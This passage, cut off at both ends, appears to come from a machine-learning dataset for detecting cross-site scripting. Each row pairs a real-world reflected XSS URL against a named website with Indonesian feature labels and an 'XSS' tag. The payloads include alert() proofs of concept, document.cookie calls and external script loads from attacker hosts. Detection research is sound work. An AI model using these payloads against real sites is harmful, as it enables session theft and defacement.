method;XSS\r\nhttp://technologygateway.nasa.gov/index.cfm?fuseaction=%22%3E%3Ciframe%20src=%22http://XSSed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://thegioiwebsite.net/tin-tuc/?action=view&pcatid=78%22%3E%3Cscript%3Ealert%281%29%3C/script%3E&scatid=86&newsid=71;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://thesaurus.com/browse/asd%22%3C/title%3E%3Cscript%3Ealert%281%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://tolan-sd.com/product_detail.php?secid=\"\"><script>alert(1)</script>\";Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://tomchalk.com/image.php?id=27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://trapster.com/forgot-password.php?email=%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cstyle%3Ebody%7Bvis ibility%3Ahidden%3B%7D+html%7Bbackground-color%3A+Black%3B%7D%3C%2Fstyle%3E%27%22%3E%3Cdiv+style%3D% 22position%3A+absolute%3Bleft%3A+420px%3Btop%3A+40px%3B%25E2%2580%258B%25E2%2580%258Bz-index%3A+10%3 Bvisibility%3A+visible%3B+color%3A+White%3B+font-size%3A+40px%3B%22%3E%3Cimg+src%3D%22http%3A%2F%2Fi nsecurity.ro%2Fboard%2Fimages%2Fstyles%2Faugreensmc%2Fgradients%2Faugreen_logo.png%22+style%3D%22hei ght%3A+385px%3B+width%3A+480px%3B%22+alt%3D%22By+test%22%3E%3Cbr%3Etest%3Cbr%3Etest%3Ciframe+src+%3D http%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DgIuotFZnBtk%22+width%3D%22400%22+height%3D%22500%22+%5C%3 E%3C%2Fdiv%3E&captcha=qw3hw5&button2=Submit;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://triprayarnadanvarthakal.com/error.asp?msg=<iframe src=\"\"http://xssed.com\"\">\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://tube.aeiou.pt/?s=%3E%22%3E%3Ciframe+src%3D%22http%3A%2F%2FXSSed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://tv1.rtp.pt/EPG/radio/programas/index.php?palavra=%3E%22%3E%3Ciframe+src%3D%22http://XSSed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://tw.socialgame.yahoo.net/link.php?exp_url=http://vaibs.site50.net/scriplet.html;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://ubisoftpoint.ubisoft.it/canvas_detail.php?id=61%27%22%3E%3Cmarquee%3E%3Cimg%20src=k.png%20onerror=alert(/XSS/.source)%20/%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://uk.ask.com/advancedsearch?o=0&l=dir&qsrc=167&q=%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3Ealert%28%22+XSS-BG%22%29%3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://ulasimhaberi.com/?s=%22%3E%3Cscript%3Ealert%28%223spi0n%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://ultimateintern.monsterenergy.com/facebook/entries.php?search=%3C/script%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://unlock.tacobell.com/unlock/?error=Please%20verify%20that%20you%27re%20not%20a%20bot%20by%20completing%20the%20image%20captcha.%3Cscript%3Ealert%28%22Give%20ME%20CODEZ%20NOWZ!!!%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://usa.visa.com/locators/locator-gmap.jsp?locale=%22;alert(1)//\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://video.syfy.com/search/q/%27%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://video.tellytube.in/list.php?q=pwn+%3CSCRIPT/SRC=%22http://tmp.vgood.com.tw/poc.js%22%3E%3C/SCRIPT%3E+pwn;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://voixhumaines.free.fr/site/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://w3.u-grenoble3.fr/lebarbe/auriane/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://wap.mercadolibre.com.ar/busqueda.php?kw=%22%3E%3Ch1%3ECross-Site%20Scripting%20%3Ca%20href=http://www.twitter.com/matiaslonigro%3E@matiaslonigro%3CsCript%3Ealert(/xss/)%3C/ScRipt%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://wap.mercadolibre.com.ar/producto.php?limit=%22%3E%3Ch1%3ECross-Site%20Scripting%3Ca%20href=http://www.twitter.com/matiaslonigro%3E@matiaslonigro%3CsCript%3Ealert(/xss/)%3C/ScRipt%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://wdt.weather.fox.com/currentWeatherPage/shortTerm.php?STATE=FL&CITY=Jacksonville%22%3E%3C/iframe%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://web.sa.mapquest.com/mobil1/?tempset=search%20%3Ciframe%20src=%22http://xssed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://webcenters.netscape.compuserve.com/weather/find.jsp?f=\"\"><script>alert(1)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://webinars.snm.org/viewer.php?meeting_id=%22%3E%27%3E%3CSCRIPT%3Ealert%28%22Hacked%20By%20Ehsan%20Ice%22%29%3C/SCRIPT%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://weblab.reliablehosting.com/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://wibiya.conduit.com/toolbar_password_recovery?Insert \"\"'><img src=vul onerror=alert('r007k17-w')>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://wiki.fewo-boosmann.de/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://wiki.legasthenietrainer.com/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://wiki.linux-aide.org/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://wiki.naissance.asso.fr/index.php/PmWikiFr/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://wiki.t-o-f.info/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://wikileaks.org/plusd/index.php?q=%22jared+cohen%22&qforigin=%27%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert%28%22XSS%20BY%20THEXUGJ%22%29%3C/scRipt%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://windowslivehelp.com/reportabuse.aspx?an=1&postid=ad98bb9f-ce1d-4aff-bfcc-cc7c4e6fe1e1%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.1001menus.com/recherche/resultats.html?rdacmh1001=1337%22%3E%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.100bestbuy.com/product.php?id=2977%22%3E%3Cscript%3Ealert%28%22XsS--G4H%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.120.li/search.php?cityid=0&keywords=%22%27/%3E%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.125mashhad.ir/Default_.aspx?lang=1&sub=0&Page_=search&order=search&search=%3Cscript%3Ealert%28%27amirmagic%27%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.2xfun.de/view.php?file=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.4cornersclub.com/local/image.php?ID=2863&Country=128%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.aa.com/i18n/reservations/whyBookAACom.jsp?origin=-->\"\"><img src=x onerror=alert(1);>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.aa.com/reservation/multiCitySearchAccess.do?anchorEvent=false&from=Nav&originAirport=\"\"><img src=x onerror=alert(1);>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.aam.org.my/forgotpassword_process.php?email=\"\"><script>alert(1)</script><\"\"&submit=Submit\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.adriano.it/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.ads.com.mm/error?message=%27%3E%3Cscript%20src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js%3E%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.aetna.com/docfind/disclaimer.jsp?site_id=medicare%22%3E%3Cscript%3Ealert(1337)%3C/script%3E,asdf;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.af-de-portu.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.agenbolsa.com/agenbolsa/index.php?cadbusqueda=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.agencebouziat.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.agencepleinsud.com/index.php?lang=it/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.agenceprodi.com/page.php?src=infoslegales.html&lang=fr/%22%3E%3Cscript%3Ealert(%27Xss%20By%20Atm0n3r%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.agence-rci.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.airfrance.co.jp/cgi-bin/AF/JP/ja/local/transverse/system/redirection.jsp?URL_REDIRECTION=http://google.com\"\"; alert(1); //\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.airfrance.com/cgi-bin/AF/FR/fr/local/transverse/system/redirection.jsp?URL_REDIRECTION=http://google.com%22;%20alert%281%29;%20//\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.airfrance.fr/cgi-bin/AF/FR/fr/local/transverse/system/redirection.jsp?URL_REDIRECTION=http://google.com\"\"; alert(1); //\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.ajcimmobilier.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.akfinancialplanners.com//?page=companies&id=1446&name=%22%3E%3Ciframe%20src=http://hotturks.org/%3E/?page=companies&id=1446&name=%22%3E%3Cscript%3Ealert(%27TheLegend%20%27)%3C/script%3EDemo%20:%20http://mnhairremoval.com//?page=companies&id=1446&name=%22%3E%3Ciframe%20src=http://hotturks.org/%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.alarabiya.net/mmGallery.php?id=10&name=%22%3E%3Cfont+size=55+color=red%3EHacked%20By+OXO%3C/font%3E%3Cscript%3Ealert%28/OXO/%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.albumdinle.biz/?s=%22%3E%3Cscript%3Ealert%28%223spi0n%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.alta.com.ge/eng/products.php?action=details&id=33539%22%3E%3Cscript%3Ealert%28/sucks/%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.americasarmy.com/vidpop.php?filePath=\"\"><script>alert(\"\"XSS Found By Rugburn\"\")</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.andaluciainformacion.es/sistema/index.asp?empresa=aaaa&login=a%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--&accion=entra r&redirect=&clave=--%3E&Submit32=Entrar;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.annuaire.journaldupirate.com/?s=XSS/\"\">&searchsubmit=Rechercher\";Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript 